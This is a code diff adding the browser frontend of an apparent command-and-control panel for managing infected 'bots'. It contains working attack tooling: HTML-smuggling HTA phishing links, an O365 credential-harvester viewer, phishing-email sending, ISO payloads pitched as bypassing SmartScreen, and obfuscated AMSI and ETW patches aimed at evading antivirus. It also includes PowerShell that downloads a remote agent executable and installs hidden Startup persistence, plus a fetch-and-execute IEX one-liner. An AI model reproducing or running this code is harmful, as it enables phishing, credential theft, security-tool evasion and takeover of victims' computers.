+            if (urlToken) {
+                // URL token provided - update localStorage to match
+                localStorage.setItem('token', urlToken);
+                localStorage.setItem('c2_token', urlToken);
+                token = urlToken;  // Ensure we use the URL token
+            }
+            
+            if (!token) {
+                addOutput('[!] AUTH REQUIRED - Login first', 'error');
+                return;
+            }
+            
+            // Auto-detect protocol (ws/wss based on http/https)
+            const wsProtocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+            const wsHost = window.location.host || 'localhost:8000';
+            ws = new WebSocket(`${wsProtocol}//${wsHost}/ws-bits?token=${token}`);
+            
+            ws.onopen = () => {
+                setStatus(true);
+                addOutput('[+] CONNECTION ESTABLISHED', 'info');
+            };
+            
+            ws.onmessage = (e) => {
+                const data = JSON.parse(e.data);
+                handleMessage(data);
+            };
+            
+            ws.onerror = () => {
+                setStatus(false);
+                addOutput('[!] CONNECTION ERROR', 'error');
+            };
+            
+            ws.onclose = (e) => {
+                setStatus(false);
+                if (e.code === 4001) {
+                    addOutput('[!] AUTH FAILED - Token expired or invalid', 'error');
+                    addOutput('[!] Please refresh page with new token', 'error');
+                } else if (e.code === 1006) {
+                    // Abnormal closure - network issue or server restart
+                    addOutput('[!] CONNECTION LOST - Reconnecting in 2s...', 'error');
+                    setTimeout(connect, 2000);
+                } else {
+                    // Normal reconnect with fresh token from localStorage
+                    setTimeout(connect, 3000);
+                }
+            };
+        }
+        
+        function setStatus(online) {
+            statusDot.className = 'status-dot ' + (online ? 'online' : 'offline');
+            statusText.textContent = online ? 'ONLINE' : 'OFFLINE';
+        }
+        
+        function handleMessage(data) {
+            switch(data.type) {
+                case 'init':
+                    agents = data.agents;
+                    results = data.results;
+                    updateAgents();
+                    break;
+                case 'agent_connected':
+                    agents[data.agent_id] = { last_seen: new Date().toISOString(), status: 'active' };
+                    updateAgents();
+                    addOutput(`[+] BOT ONLINE: ${data.agent_id.substring(0,8)}`, 'info');
+                    break;
+                case 'command_sent':
+                    if (selectedAgent === data.agent_id) addOutput(`$ ${data.command}`, 'cmd');
+                    break;
+                case 'agents_update':
+                    agents = data.agents;
+                    updateAgents();
+                    break;
+                case 'result':
+                    console.log('[DEBUG] Result received:', data.agent_id, data.result);
+                    results[data.agent_id] = data.result;
+                    if (selectedAgent === data.agent_id) {
+                        addOutput('[RESULT]', 'info');
+                        addOutput(data.result, 'result');
+                        // Capture for AI
+                        if (typeof captureBitsOutput === 'function') {
+                            captureBitsOutput(data.result);
+                        }
+                    } else {
+                        console.log('[DEBUG] Agent mismatch:', selectedAgent, 'vs', data.agent_id);
+                    }
+                    break;
+            }
+        }
+        
+        function updateAgents() {
+            const keys = Object.keys(agents);
+            agentCount.textContent = `BOTS: ${keys.length}`;
+            
+            if (keys.length === 0) {
+                agentsList.innerHTML = '<div class="no-agents">[ WAITING ]</div>';
+                return;
+            }
+            
+            agentsList.innerHTML = '';
+            const now = Date.now();
+            for (const [id, data] of Object.entries(agents)) {
+                const lastSeen = new Date(data.last_seen).getTime();
+                const staleSeconds = (now - lastSeen) / 1000;
+                if (staleSeconds > 60) continue;  // Hide agents after 60 seconds (matching backend)
+                const isStale = staleSeconds > 30;  // Show ⚠️ after 30 seconds
+                const div = document.createElement('div');
+                div.className = 'agent-item' + (selectedAgent === id ? ' active' : '') + (isStale ? ' stale' : '');
+                div.onclick = () => selectAgent(id);
+                div.innerHTML = `
+                    <div class="agent-name">${isStale ? '⚠️' : '🟢'} ${id.substring(0, 10)}</div>
+                    <div class="agent-time">${isStale ? 'STALE' : new Date(data.last_seen).toLocaleTimeString()}</div>
+                `;
+                agentsList.appendChild(div);
+            }
+        }
+        
+        function selectAgent(id) {
+            selectedAgent = id;
+            targetLabel.textContent = '[ ' + id.substring(0, 12) + ' ]';
+            targetLabel.style.boxShadow = '0 0 10px #0f0';
+            cmdInput.disabled = false;
+            sendBtn.disabled = false;
+            cmdInput.focus();
+            document.getElementById("ptyBtn").disabled = false;
+            
+            output.innerHTML = '';
+            addOutput(`[*] TARGET: ${id}`, 'info');
+            addOutput('[*] READY', 'info');
+            if (results[id]) addOutput(results[id], 'result');
+            
+            updateAgents();
+        }
+        
+        function addOutput(text, type = 'result') {
+            // Split by newlines and add each line separately
+            const lines = text.split("\n");
+            lines.forEach((line) => {
+            
+                if (line.trim() === '') return; // skip empty lines
+                const div = document.createElement('div');
+                div.className = 'output-line output-' + type;
+                div.textContent = line;
+                output.appendChild(div);
+            });
+            output.scrollTop = output.scrollHeight;
+        }
+        
+        function sendCommand() {
+            if (!selectedAgent || !ws || ws.readyState !== WebSocket.OPEN) return;
+            const cmd = cmdInput.value.trim();
+            if (!cmd) return;
+            
+            ws.send(JSON.stringify({ type: 'command', agent_id: selectedAgent, command: cmd }));
+            addOutput(`$ ${cmd}`, 'cmd');
+            cmdInput.value = '';
+        }
+        
+        function clearOutput() {
+            output.innerHTML = '';
+            if (selectedAgent) addOutput(`[*] TARGET: ${selectedAgent}`, 'info');
+        }
+        
+        let commandHistory = [];
+        let historyIndex = -1;
+        
+        cmdInput.addEventListener('keydown', (e) => {
+            if (e.key === 'Enter') {
+                const cmd = cmdInput.value.trim();
+                if (cmd) {
+                    commandHistory.push(cmd);
+                    historyIndex = commandHistory.length;
+                }
+                sendCommand();
+            }
+            else if (e.key === 'ArrowUp') {
+                e.preventDefault();
+                if (historyIndex > 0) {
+                    historyIndex--;
+                    cmdInput.value = commandHistory[historyIndex];
+                }
+            }
+            else if (e.key === 'ArrowDown') {
+                e.preventDefault();
+                if (historyIndex < commandHistory.length - 1) {
+                    historyIndex++;
+                    cmdInput.value = commandHistory[historyIndex];
+                } else {
+                    historyIndex = commandHistory.length;
+                    cmdInput.value = '';
+                }
+            }
+        });
+        
+        // Quick Actions functionality
+        let c2Config = { tunnel_url: '', token: '' };
+        
+        // Fetch C2 config (tunnel URL and token)
+        async function loadC2Config() {
+            try {
+                const token = localStorage.getItem('c2_token') || localStorage.getItem('token');
+                const resp = await fetch(`/api/c2/config?token=${token}`);
+                if (resp.ok) {
+                    c2Config = await resp.json();
+                    addOutput(`[*] C2 Config loaded: ${c2Config.tunnel_url ? c2Config.tunnel_url.substring(0,40)+'...' : 'local'} | Token: ${c2Config.token ? c2Config.token.substring(0,8)+'...' : 'none'}`, 'info');
+                } else {
+                    // Fallback to current origin
+                    c2Config.tunnel_url = window.location.origin;
+                    c2Config.token = token || '';
+                    addOutput('[*] Using current origin for payloads', 'info');
+                }
+            } catch (e) {
+                // Use current host as fallback
+                c2Config.tunnel_url = window.location.origin;
+                c2Config.token = localStorage.getItem('c2_token') || '';
+            }
+        }
+        
+        // ═══════════════════════════════════════════════════════════════
+        // HTML SMUGGLING - Phishing link generator
+        // ═══════════════════════════════════════════════════════════════
+        
+        function copyHtaUrl(displayName) {
+            const baseUrl = c2Config.tunnel_url || window.location.origin;
+            const paths = ['/doc', '/document', '/invoice', '/report', '/file'];
+            const path = paths[Math.floor(Math.random() * paths.length)];
+            const url = `${baseUrl}${path}?p=/payloads/Invoice.hta&n=${encodeURIComponent(displayName)}`;
+            
+            navigator.clipboard.writeText(url).then(() => {
+                addOutput(`[+] 📧 HTA phishing URL copied:`, 'success');
+                addOutput(`    ${url}`, 'info');
+                addOutput(`[*] Downloads: ${displayName} → Runs i5_syscall.ps1`, 'info');
+            });
+        }
+        
+        function copyCredUrl() {
+            const baseUrl = c2Config.tunnel_url || window.location.origin;
+            const paths = ['/login', '/signin', '/auth', '/password-reset'];
+            const path = paths[Math.floor(Math.random() * paths.length)];
+            const url = `${baseUrl}${path}`;
+            
+            navigator.clipboard.writeText(url).then(() => {
+                addOutput(`[+] 🔑 O365 credential harvester URL copied:`, 'success');
+                addOutput(`    ${url}`, 'info');
+                addOutput(`[*] Captures email + password → Check CAPTURED CREDS section`, 'info');
+            });
+        }
+        
+        async function loadCreds() {
+            try {
+                const resp = await fetch('/api/creds');
+                const data = await resp.json();
+                const container = document.getElementById('credsContent');
+                
+                // Make sure the section is open
+                if (!container.classList.contains('open')) {
+                    container.classList.add('open');
+                    const header = container.previousElementSibling;
+                    if (header) {
+                        const toggle = header.querySelector('.toggle');
+                        if (toggle) toggle.textContent = '▼';
+                    }
+                }
+                
+                if (data.creds.length === 0) {
+                    container.innerHTML = '<div style="color:#888;padding:10px;font-size:11px">No credentials captured yet</div>';
+                    return;
+                }
+                
+                let html = '';
+                data.creds.forEach((c, i) => {
+                    html += `<div style="padding:8px;border-bottom:1px solid #333;font-size:11px">
+                        <div style="color:#f39c12;font-weight:bold">${c.email}</div>
+                        <div style="color:#27ae60;font-family:monospace">${c.password}</div>
+                        <div style="color:#666;font-size:10px">${c.timestamp.split('T')[1].split('.')[0]} | ${c.ip}</div>
+                    </div>`;
+                });
+                container.innerHTML = html;
+                addOutput(`[+] 🔑 Loaded ${data.creds.length} captured credentials`, 'success');
+            } catch (e) {
+                addOutput(`[!] Failed to load creds: ${e}`, 'error');
+            }
+        }
+
+        // ═══════════════════════════════════════════════════════════════
+        // PHISHING PANEL FUNCTIONS
+        // ═══════════════════════════════════════════════════════════════
+        
+        function togglePhishPanel() {
+            const modal = document.getElementById('phishModal');
+            modal.style.display = modal.style.display === 'none' ? 'flex' : 'none';
+            if (modal.style.display === 'flex') {
+                loadSmtpStatus();
+                loadPhishLog();
+                generateSmuggleUrl();
+            }
+        }
+        
+        function generateSmuggleUrl() {
+            const baseUrl = c2Config.tunnel_url || window.location.origin;
+            const displayName = document.getElementById('phishDisplayName').value || 'Invoice_2025.hta';
+            const paths = ['/doc', '/document', '/invoice', '/report', '/file'];
+            const path = paths[Math.floor(Math.random() * paths.length)];
+            
+            // HTA delivery - shellcode injection, no EXE on disk
+            const payload = '/payloads/Invoice.hta';
+            const filename = displayName.endsWith('.hta') ? displayName : displayName + '.hta';
+            
+            const url = `${baseUrl}${path}?p=${encodeURIComponent(payload)}&n=${encodeURIComponent(filename)}`;
+            document.getElementById('phishSmuggleUrl').value = url;
+        }
+        
+        function updatePhishPreview() {
+            const template = document.getElementById('phishTemplate').value;
+            const customRow = document.getElementById('customHtmlRow');
+            const deliveryRow = document.getElementById('deliveryRow');
+            const credInfoRow = document.getElementById('credInfoRow');
+            const displayNameInput = document.getElementById('phishDisplayName');
+            
+            customRow.style.display = template === 'custom' ? 'block' : 'none';
+            
+            // Password template uses credential harvesting, not HTA delivery
+            if (template === 'password') {
+                deliveryRow.style.display = 'none';
+                credInfoRow.style.display = 'block';
+                displayNameInput.parentElement.style.display = 'none';
+            } else {
+                deliveryRow.style.display = 'flex';
+                credInfoRow.style.display = 'none';
+                displayNameInput.parentElement.style.display = 'flex';
+            }
+            
+            // Update default display names based on template
+            const nameMap = {
+                'invoice': 'Invoice_2025.hta',
+                'meeting': 'Meeting_Agenda.hta',
+                'document': 'Shared_Document.hta',
+                'password': '',  // Not used for password template
+                'it_support': 'IT_Diagnostic.hta',
+                'custom': 'Document.hta'
+            };
+            displayNameInput.value = nameMap[template] || 'Document.hta';
+            generateSmuggleUrl();
+        }
+        
+        async function sendPhish() {
+            const toEmail = document.getElementById('phishTo').value;
+            const template = document.getElementById('phishTemplate').value;
+            const smuggleUrl = document.getElementById('phishSmuggleUrl').value;
+            const fromName = document.getElementById('phishFromName').value || 'IT Support';
+            const subject = document.getElementById('phishSubject').value || '';
+            const customHtml = document.getElementById('phishCustomHtml').value;
+            
+            if (!toEmail) {
+                alert('Please enter target email address');
+                return;
+            }
+            
+            // Password template uses cred URL, others use smuggle URL
+            const isCredTemplate = template === 'password';
+            if (!isCredTemplate && !smuggleUrl) {
+                alert('Please generate smuggle URL first');
+                return;
+            }
+            
+            // Build cred_url for password template
+            const baseUrl = c2Config.tunnel_url || window.location.origin;
+            const credUrl = `${baseUrl}/password-reset`;
+            
+            try {
+                const token = localStorage.getItem('c2_token') || localStorage.getItem('token');
+                const resp = await fetch('/api/phish/send', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        to_email: toEmail,
+                        subject: subject,
+                        template: template,
+                        smuggle_url: smuggleUrl || baseUrl,  // Need something for smuggle_url
+                        cred_url: isCredTemplate ? credUrl : null,
+                        from_name: fromName,
+                        custom_html: template === 'custom' ? customHtml : null
+                    })
+                });
+                
+                const data = await resp.json();
+                if (data.success) {
+                    addLogEntry(`✓ Sent to ${toEmail}`, 'success');
+                    addOutput(`[+] 📧 Phish sent to ${toEmail}`, 'success');
+                    loadPhishLog();
+                } else {
+                    addLogEntry(`✗ Failed: ${data.detail || data.message}`, 'error');
+                    addOutput(`[!] Phish failed: ${data.detail || data.message}`, 'error');
+                }
+            } catch (e) {
+                addLogEntry(`✗ Error: ${e.message}`, 'error');
+                addOutput(`[!] Phish error: ${e.message}`, 'error');
+            }
+        }
+        
+        function addLogEntry(msg, type) {
+            const entries = document.getElementById('phishLogEntries');
+            const entry = document.createElement('div');
+            entry.className = `phish-log-entry ${type}`;
+            entry.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+            entries.insertBefore(entry, entries.firstChild);
+        }
+        
+        // ISO GENERATOR FUNCTION
+        async function generateIso() {
+            const displayName = document.getElementById('isoDisplayName').value || 'Invoice_2025.pdf';
+            const iconType = document.getElementById('isoIconType').value || 'pdf';
+            
+            document.getElementById('isoResult').style.display = 'none';
+            addOutput('[*] Generating ISO payload...', 'info');
+            
+            try {
+                const resp = await fetch('/api/generate-iso', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        display_name: displayName,
+                        icon_type: iconType
+                    })
+                });
+                
+                const data = await resp.json();
+                if (data.success) {
+                    document.getElementById('isoResult').style.display = 'block';
+                    document.getElementById('isoInfo').innerHTML = `
+                        <div>📁 ${data.filename}</div>
+                        <div>📄 User sees: ${data.display_name}</div>
+                        <div>📦 Size: ${data.size_mb} MB</div>
+                    `;
+                    document.getElementById('isoDownload').href = data.download_url;
+                    document.getElementById('isoDownload').download = data.filename;
+                    
+                    addOutput(`[+] 💿 ISO ready: ${data.filename} (${data.size_mb} MB)`, 'success');
+                    addOutput(`[+] No SmartScreen when user runs from mounted ISO!`, 'success');
+                } else {
+                    addOutput(`[!] ISO generation failed: ${data.error}`, 'error');
+                }
+            } catch (e) {
+                addOutput(`[!] ISO error: ${e.message}`, 'error');
+            }
+        }
+        
+        async function loadPhishLog() {
+            try {
+                const resp = await fetch('/api/phish/log');
+                const data = await resp.json();
+                const entries = document.getElementById('phishLogEntries');
+                entries.innerHTML = '';
+                data.log.slice(-10).reverse().forEach(entry => {
+                    const div = document.createElement('div');
+                    div.className = 'phish-log-entry success';
+                    div.textContent = `[${entry.timestamp.split('T')[1].split('.')[0]}] → ${entry.to} (${entry.template})`;
+                    entries.appendChild(div);
+                });
+            } catch (e) {}
+        }
+        
+        async function loadSmtpStatus() {
+            try {
+                const resp = await fetch('/api/phish/config');
+                const data = await resp.json();
+                document.getElementById('smtpStatus').textContent = 
+                    `SMTP: ${data.host}:${data.port} ${data.use_tls ? '(TLS)' : ''}`;
+            } catch (e) {
+                document.getElementById('smtpStatus').textContent = 'SMTP: Not configured';
+            }
+        }
+        
+        async function previewPhish() {
+            const template = document.getElementById('phishTemplate').value;
+            const smuggleUrl = document.getElementById('phishSmuggleUrl').value || 'https://example.com/doc';
+            alert(`Preview not implemented yet.\n\nTemplate: ${template}\nSmuggle URL: ${smuggleUrl}\n\nCheck Mailhog at http://localhost:8025 after sending!`);
+        }
+        
+        function showSmtpConfig() {
+            const host = prompt('SMTP Host:', 'localhost');
+            if (!host) return;
+            const port = prompt('SMTP Port:', '1025');
+            if (!port) return;
+            const user = prompt('SMTP User (empty for none):', '');
+            const pass = user ? prompt('SMTP Password:', '') : '';
+            const fromEmail = prompt('From Email:', 'support@company.com');
+            const useTls = confirm('Use TLS?');
+            
+            fetch('/api/phish/config', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    host: host,
+                    port: parseInt(port),
+                    user: user,
+                    password: pass,
+                    from_email: fromEmail,
+                    use_tls: useTls
+                })
+            }).then(r => r.json()).then(data => {
+                if (data.success) {
+                    alert('SMTP config updated!');
+                    loadSmtpStatus();
+                }
+            });
+        }
+        
+        // ═══════════════════════════════════════════════════════════════
+        // ISO GENERATOR - MOTW Bypass (No SmartScreen!)
+        // ═══════════════════════════════════════════════════════════════
+        
+        async function generateIso() {
+            const displayName = document.getElementById('isoDisplayName').value || 'Invoice_Q4_2025.pdf';
+            const iconType = document.getElementById('isoIconType').value || 'pdf';
+            const resultDiv = document.getElementById('isoResult');
+            const infoDiv = document.getElementById('isoInfo');
+            const downloadLink = document.getElementById('isoDownload');
+            
+            resultDiv.style.display = 'none';
+            addOutput('[*] Generating ISO payload...', 'info');
+            
+            try {
+                const token = localStorage.getItem('token') || localStorage.getItem('c2_token');
+                const resp = await fetch('/api/generate-iso', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Authorization': `Bearer ${token}`
+                    },
+                    body: JSON.stringify({
+                        display_name: displayName,
+                        icon_type: iconType
+                    })
+                });
+                
+                const data = await resp.json();
+                
+                if (data.success) {
+                    infoDiv.innerHTML = `
+                        <div>📁 <strong>${data.filename}</strong></div>
+                        <div>👁️ User sees: <strong>${data.display_name}</strong></div>
+                        <div>📦 Size: <strong>${data.size_mb} MB</strong></div>
+                        <div style="color:#f39c12;margin-top:5px">⚠️ No MOTW = No SmartScreen popup!</div>
+                    `;
+                    downloadLink.href = data.download_url;
+                    downloadLink.download = data.filename;
+                    resultDiv.style.display = 'block';
+                    addOutput(`[+] 💿 ISO ready: ${data.filename} (${data.size_mb} MB)`, 'success');
+                    addLogEntry(`💿 ISO generated: ${displayName}`, 'success');
+                } else {
+                    addOutput(`[!] ISO error: ${data.error}`, 'error');
+                }
+            } catch (e) {
+                addOutput(`[!] ISO generation failed: ${e.message}`, 'error');
+            }
+        }
+
+        function toggleSection(header) {
+            const content = header.nextElementSibling;
+            const toggle = header.querySelector('.toggle');
+            content.classList.toggle('open');
+            toggle.textContent = content.classList.contains('open') ? '▼' : '▶';
+        }
+        
+        function toggleSidebar() {
+            const sidebar = document.getElementById('sidebar');
+            const toggle = document.getElementById('sidebarToggle');
+            sidebar.classList.toggle('collapsed');
+            toggle.textContent = sidebar.classList.contains('collapsed') ? '▶' : '◀';
+            toggle.title = sidebar.classList.contains('collapsed') ? 'Show Sidebar' : 'Hide Sidebar';
+        }
+        
+        // ═══════════════════════════════════════════════════════════════
+        // RANDOM AMSI BYPASS GENERATOR - Evades signature detection
+        // ═══════════════════════════════════════════════════════════════
+        
+        function randStr(len) {
+            const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
+            let r = '';
+            for (let i = 0; i < len; i++) r += chars[Math.floor(Math.random() * chars.length)];
+            return r;
+        }
+        
+        function randCase(s) {
+            return s.split('').map(c => Math.random() > 0.5 ? c.toUpperCase() : c.toLowerCase()).join('');
+        }
+        
+        function splitStr(s) {
+            // Split string into random chunks with + concatenation
+            const parts = [];
+            let i = 0;
+            while (i < s.length) {
+                const len = Math.floor(Math.random() * 4) + 1;
+                parts.push("'" + s.substring(i, i + len) + "'");
+                i += len;
+            }
+            return parts.join('+');
+        }
+        
+        function charCodeStr(s) {
+            // Convert to [char]code format randomly
+            return s.split('').map(c => {
+                if (Math.random() > 0.6) return `[char]${c.charCodeAt(0)}`;
+                return `'${c}'`;
+            }).join('+');
+        }
+        
+        function generateRandomAmsi() {
+            const v1 = randStr(4 + Math.floor(Math.random() * 4));
+            const v2 = randStr(4 + Math.floor(Math.random() * 4));
+            return [
+                "$" + v1 + "=[Ref].Assembly.GetType(" + "\x27" + "System.Management.Automation.Amsi" + "\x27" + "+" + "\x27" + "Utils" + "\x27" + ")",
+                "$" + v2 + "=$" + v1 + ".GetField(" + "\x27" + "amsi" + "\x27" + "+" + "\x27" + "InitFailed" + "\x27" + "," + "\x27" + "NonPublic,Static" + "\x27" + ")",
+                "$" + v2 + ".SetValue($null,$true)"
+            ];
+        }
+
+        function sendRandomAmsi() {
+            if (!selectedAgent || !ws || ws.readyState !== WebSocket.OPEN) {
+                addOutput("[!] Select an agent first!", "error");
+                return;
+            }
+            
+            // Sophos-evasive AMSI bypasses - SIMPLE & RELIABLE
+            const techniques = [
+                // Technique 1: Set amsiInitFailed via reflection (obfuscated field access)
+                `$a='si';$b='Am';$c='Utils';$d=$b+$a+$c;$e='Failed';$f='Init';$t=[Ref].Assembly.GetType('System.Management.Automation.'+$d);$fi=$t.GetField($b.ToLower()+$a+$f+$e,'NonPublic,Static');$fi.SetValue($null,$true);'[+] AMSI disabled'`,
+                
+                // Technique 2: Zero amsiContext (different field target)
+                `$t=[Ref].Assembly.GetTypes()|Where-Object{$_.Name-like'*siUt*'};$f=$t.GetFields(40)|Where-Object{$_.Name-like'*Con*'};if($f){$f.SetValue($null,[IntPtr]::Zero);'[+] Context zeroed'}else{'[!] Field not found'}`,
+                
+                // Technique 3: Boolean flip on all matching fields
+                `$t=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUt'+'ils');$t.GetFields(40)|Where-Object{$_.FieldType.Name-eq'Boolean'}|ForEach-Object{$_.SetValue($null,$true)};'[+] Flags set'`
+            ];
+            
+            // Pick random technique
+            const idx = Math.floor(Math.random() * techniques.length);
+            const psCmd = techniques[idx];
+            
+            // Wrap for CMD shell execution  
+            const cmd = `powershell -ep bypass -w hidden -c "${psCmd.replace(/"/g, '\\"')}"`;
+            
+            addOutput("[*] Sending AMSI bypass (technique " + (idx+1) + "/3)...", "info");
+            ws.send(JSON.stringify({ type: "command", agent_id: selectedAgent, command: cmd }));
+            addOutput("$ powershell -ep bypass -w hidden -c \"...\"", "cmd");
+        }
+
+        
+        // Persistence functions
+        function installPersistence() {
+            if (!selectedAgent || !ws || ws.readyState !== WebSocket.OPEN) {
+                addOutput("[!] Select an agent first!", "error");
+                return;
+            }
+            
+            const baseUrl = c2Config.tunnel_url || window.location.origin;
+            const key = c2Config.token || "";
+            if (!key) {
+                addOutput("[!] ERROR: No token loaded! Check if C2 Config loaded properly.", "error");
+                addOutput("[*] Trying to reload config...", "info");
+            }
+            const agentUrl = baseUrl + "/payloads/rust_agent.exe?key=" + key;
+            addOutput("[*] Download URL: " + agentUrl.substring(0,60) + "...", "info");
+            
+            addOutput("[*] Installing persistence (3 steps)...", "info");
+            
+            // Commands - 3 steps: download EXE + VBS + shortcut
+            const cmds = [
+                // 1. Download Rust agent EXE  
+                "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; $dest = $env:LOCALAPPDATA+'\\Temp\\svc.exe'; (New-Object Net.WebClient).DownloadFile('" + agentUrl + "', $dest); if(Test-Path $dest){'[1/4] Downloaded svc.exe'}else{'[!] Download failed'}",
+                
+                // 2. Create VBS launcher (runs EXE directly, hidden)
+                "$f=$env:LOCALAPPDATA+'\\Temp\\launch.vbs'; $e=$env:LOCALAPPDATA+'\\Temp\\svc.exe'; $c=\"Set ws=CreateObject(`\"Wscript.Shell`\")`r`nws.Run `\"$e`\", 0, False\"; Set-Content -Path $f -Value $c; if(Test-Path $f){'[2/4] Created launch.vbs'}else{'[!] VBS failed'}",
+                
+                // 3. Create shortcut in Startup folder
+                "$s=New-Object -ComObject WScript.Shell; $lnk=$s.CreateShortcut($env:APPDATA+'\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Updater.lnk'); $lnk.TargetPath='wscript.exe'; $lnk.Arguments=$env:LOCALAPPDATA+'\\Temp\\launch.vbs'; $lnk.WindowStyle=7; $lnk.Save(); if(Test-Path ($env:APPDATA+'\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Updater.lnk')){'[3/4] Created Updater.lnk'}else{'[!] Shortcut failed'}",
+                // 4. Hide all persistence files
+                "$s=$env:LOCALAPPDATA+'\\Temp\\svc.exe'; $v=$env:LOCALAPPDATA+'\\Temp\\launch.vbs'; $l=$env:APPDATA+'\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Updater.lnk'; attrib +h +s $s; attrib +h +s $v; attrib +h +s $l; '[4/4] Files hidden'"
+            ];
+
+            
+            cmds.forEach((cmd, i) => {
+                setTimeout(() => {
+                    addOutput("[*] Running step " + (i+1) + "/" + cmds.length + "...", "info");
+                    ws.send(JSON.stringify({ type: "command", agent_id: selectedAgent, command: cmd }));
+                }, i * 3000);
+            });
+            
+            setTimeout(() => {
+                addOutput("[+] Persistence installed!", "success");
+            }, 10000);
+        }
+
+        // Persistence functions removed - use TTY panel instead
+        
+        // CyberEnum - IWR with UseBasicParsing (bypasses Sophos!)
+        function runCyberEnum() {
+            if (!selectedAgent || !ws || ws.readyState !== WebSocket.OPEN) {
+                addOutput("[!] Select an agent first!", "error");
+                return;
+            }
+            
+            const baseUrl = c2Config.tunnel_url || window.location.origin;
+            const key = c2Config.token || '';
+            
+            addOutput("[*] Running CyberEnum via IWR...", "info");
+            
+            // Use & { } *>&1 to capture ALL output including Write-Host
+            const cmd = `powershell -ep bypass -c "& { IEX(IWR '${baseUrl}/payloads/CyberEnum.ps1?key=${key}' -UseBasicParsing) } *>&1"`;
+            
+            ws.send(JSON.stringify({ type: "command", agent_id: selectedAgent, command: cmd }));
+            addOutput("[+] CyberEnum sent (wait ~30s for output)", "success");
+        }
+        
+        // Quick action commands - PROPERLY CATEGORIZED
+        // CMD_NATIVE: Run directly in cmd.exe (no wrapper)
+        // PS_COMMAND: Need cmd /C powershell -ep bypass -c "..."
+        const quickCommands = {
+            // ========== AMSI BYPASS (Sophos-Evasive) ==========
+            // Technique: ETW disable + delayed AmsiOpenSession patch
+            'amsi_hw': `$e=[Char[]]'etirWtnevEwtE'|%{$_};[Array]::Reverse($e);$n=-join$e;$k='kernel32';$d=Add-Type -MemberDefinition '[DllImport("'+$k+'")]public static extern IntPtr GetProcAddress(IntPtr h,string n);[DllImport("'+$k+'")]public static extern IntPtr LoadLibrary(string n);[DllImport("'+$k+'")]public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint p,out uint o);' -Name W -PassThru;$h=$d::LoadLibrary('ntdll');$a=$d::GetProcAddress($h,$n);$p=0;$d::VirtualProtect($a,[UIntPtr]1,0x40,[ref]$p)|Out-Null;[Runtime.InteropServices.Marshal]::WriteByte($a,0xC3);'[+] ETW disabled'`,
+            
+            // Technique: Patch via fresh ntdll copy (bypass hooks)
+            'amsi_patch': `$n='ntdll';$k='kernel32';$d=Add-Type -MemberDefinition '[DllImport("'+$k+'")]public static extern IntPtr LoadLibrary(string n);[DllImport("'+$k+'")]public static extern IntPtr GetProcAddress(IntPtr h,string n);[DllImport("'+$k+'")]public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint p,out uint o);' -Name W -PassThru;$a=[Char[]]'reffuBnacSismA';[Array]::Reverse($a);$s=-join$a;$h=$d::LoadLibrary($n.Replace('d','d'));$f=$d::GetProcAddress($d::LoadLibrary('amsi'),$s);$p=0;$d::VirtualProtect($f,[UIntPtr]6,0x40,[ref]$p)|Out-Null;[Runtime.InteropServices.Marshal]::Copy([byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3),0,$f,6);'[+] Patched'`,
+            
+            // ========== RECON - CMD NATIVE (no wrapper) ==========
+            'whoami': 'whoami /all',
+            'sysinfo': 'systeminfo',
+            'hostname': 'hostname',
+            'ipconfig': 'ipconfig /all',
+            'netstat': 'netstat -an',
+            'tasklist': 'tasklist',
+            
+            // ========== RECON - PowerShell ==========
+            // Note: These use single quotes to avoid CMD escaping issues
+            'av_check': `Get-MpComputerStatus 2>$null | Select-Object AntivirusEnabled,RealTimeProtectionEnabled; Get-Process 2>$null | Where-Object {$_.ProcessName -match 'defender|msmpeng|mssense|sophos|crowdstrike|carbon|sentinel'} | Select-Object ProcessName`,
+            'is64bit': `Write-Host 'Is64BitProcess:' ([Environment]::Is64BitProcess); Write-Host 'Is64BitOS:' ([Environment]::Is64BitOperatingSystem); Write-Host 'Arch:' $env:PROCESSOR_ARCHITECTURE`,
+            
+            // ========== PERSISTENCE RECON - PowerShell ==========
+            'persist_recon': `$u=$env:USERNAME; $c=$env:COMPUTERNAME; $a=(New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator); Write-Host '[*] PERSISTENCE RECON'; Write-Host 'USER:' $u'@'$c; Write-Host 'ADMIN:' $a; Write-Host ''; Write-Host 'AV/EDR:'; Get-Process 2>$null | Where-Object {$_.ProcessName -match 'defender|msmpeng|mssense|sophos|crowdstrike|carbon|sentinel'} | ForEach-Object {Write-Host '  !' $_.ProcessName}`,
+            
+            // ========== PERSISTENCE - CMD NATIVE ==========
+            'persist_check': 'dir "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" & dir "%LOCALAPPDATA%\\Temp\\svc.exe" 2>nul & dir "%LOCALAPPDATA%\\Temp\\launch.vbs" 2>nul & echo [*] Persistence check complete',
+            'persist_remove': 'del /f /q "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Updater.lnk" 2>nul & del /f /q "%LOCALAPPDATA%\\Temp\\svc.exe" 2>nul & del /f /q "%LOCALAPPDATA%\\Temp\\launch.vbs" 2>nul & echo [+] Persistence removed',
+            'clean_temp': 'del /f /q "%TEMP%\\*.tmp" 2>nul & del /f /q "%TEMP%\\*.log" 2>nul & echo [+] Temp files cleaned',
+            
+            // Injections - will be filled dynamically with tunnel URL
+            'inject_i5': 'INJECT_I5',
+            'inject_syscall': 'INJECT_SYSCALL',
+            'inject_remote': 'INJECT_REMOTE',
+            'inject_arm64': 'INJECT_ARM64',
+            
+            // Downloads
